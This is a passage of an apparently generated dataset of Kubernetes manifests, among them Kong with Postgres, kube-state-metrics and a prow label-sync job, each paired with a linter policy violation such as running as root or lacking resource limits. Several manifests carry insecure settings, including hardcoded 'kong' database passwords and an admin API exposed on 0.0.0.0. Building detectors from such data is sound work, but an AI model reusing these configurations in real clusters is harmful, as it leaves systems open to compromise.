    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: kube-prometheus\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: kube-prometheus\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: harbor.chanty.21vianet.com/library/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          limits:\n            cpu: 100m\n            memory: 250Mi\n          requests:\n            cpu: 10m\n            memory: 190Mi\n        securityContext:\n          runAsUser: 65534\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          limits:\n            cpu: 40m\n            memory: 40Mi\n          requests:\n            cpu: 20m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          limits:\n            cpu: 20m\n            memory: 40Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-state-metrics\" does not have a read-only root file system"
  },
  {
    "id": "8645",
    "manifest_path": "data/manifests/the_stack_sample/sample_3247.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: kube-prometheus\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: kube-prometheus\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: harbor.chanty.21vianet.com/library/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          limits:\n            cpu: 100m\n            memory: 250Mi\n          requests:\n            cpu: 10m\n            memory: 190Mi\n        securityContext:\n          runAsUser: 65534\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          limits:\n            cpu: 40m\n            memory: 40Mi\n          requests:\n            cpu: 20m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          limits:\n            cpu: 20m\n            memory: 40Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-state-metrics\" not found"
  },
  {
    "id": "8646",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (image-pruner), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "8647",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pruner\" is using an invalid container image, \"getupcloud/imagepruner:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8648",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pruner\" does not have a read-only root file system"
  },
  {
    "id": "8649",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"image-pruner\" not found"
  },
  {
    "id": "8650",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pruner\" is not set to runAsNonRoot"
  },
  {
    "id": "8651",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pruner\" has cpu request 0"
  },
  {
    "id": "8652",
    "manifest_path": "data/manifests/the_stack_sample/sample_3248.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    role: pruner\nspec:\n  containers:\n  - image: getupcloud/imagepruner:latest\n    name: pruner\n    env:\n    - name: KEEP_COMPLETE\n      value: ${KEEP_COMPLETE}\n    - name: KEEP_FAILED\n      value: ${KEEP_FAILED}\n    - name: KEEP_TAGS\n      value: ${KEEP_TAGS}\n    - name: KEEP_YOUNGER\n      value: ${KEEP_YOUNGER}\n    - name: PRUNE_EXTERNAL\n      value: ${PRUNE_EXTERNAL}\n  serviceAccount: image-pruner\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pruner\" has memory limit 0"
  },
  {
    "id": "8653",
    "manifest_path": "data/manifests/the_stack_sample/sample_3250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200831-223e625607\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "8654",
    "manifest_path": "data/manifests/the_stack_sample/sample_3250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200831-223e625607\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "8655",
    "manifest_path": "data/manifests/the_stack_sample/sample_3250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200831-223e625607\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "8656",
    "manifest_path": "data/manifests/the_stack_sample/sample_3250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200831-223e625607\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "8657",
    "manifest_path": "data/manifests/the_stack_sample/sample_3252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apim-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: apim-operator\n  template:\n    metadata:\n      labels:\n        name: apim-operator\n    spec:\n      serviceAccountName: apim-operator\n      containers:\n      - name: apim-operator\n        image: pubudu/apim-operator:1.0.0\n        command:\n        - apim-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: apim-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"apim-operator\" does not have a read-only root file system"
  },
  {
    "id": "8658",
    "manifest_path": "data/manifests/the_stack_sample/sample_3252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apim-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: apim-operator\n  template:\n    metadata:\n      labels:\n        name: apim-operator\n    spec:\n      serviceAccountName: apim-operator\n      containers:\n      - name: apim-operator\n        image: pubudu/apim-operator:1.0.0\n        command:\n        - apim-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: apim-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"apim-operator\" not found"
  },
  {
    "id": "8659",
    "manifest_path": "data/manifests/the_stack_sample/sample_3252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apim-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: apim-operator\n  template:\n    metadata:\n      labels:\n        name: apim-operator\n    spec:\n      serviceAccountName: apim-operator\n      containers:\n      - name: apim-operator\n        image: pubudu/apim-operator:1.0.0\n        command:\n        - apim-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: apim-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"apim-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8660",
    "manifest_path": "data/manifests/the_stack_sample/sample_3252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apim-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: apim-operator\n  template:\n    metadata:\n      labels:\n        name: apim-operator\n    spec:\n      serviceAccountName: apim-operator\n      containers:\n      - name: apim-operator\n        image: pubudu/apim-operator:1.0.0\n        command:\n        - apim-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: apim-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"apim-operator\" has cpu request 0"
  },
  {
    "id": "8661",
    "manifest_path": "data/manifests/the_stack_sample/sample_3252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apim-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: apim-operator\n  template:\n    metadata:\n      labels:\n        name: apim-operator\n    spec:\n      serviceAccountName: apim-operator\n      containers:\n      - name: apim-operator\n        image: pubudu/apim-operator:1.0.0\n        command:\n        - apim-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: apim-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"apim-operator\" has memory limit 0"
  },
  {
    "id": "8662",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kong\" does not have a read-only root file system"
  },
  {
    "id": "8663",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "8664",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kong\" is not set to runAsNonRoot"
  },
  {
    "id": "8665",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "8666",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kong\" has cpu request 0"
  },
  {
    "id": "8667",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "8668",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 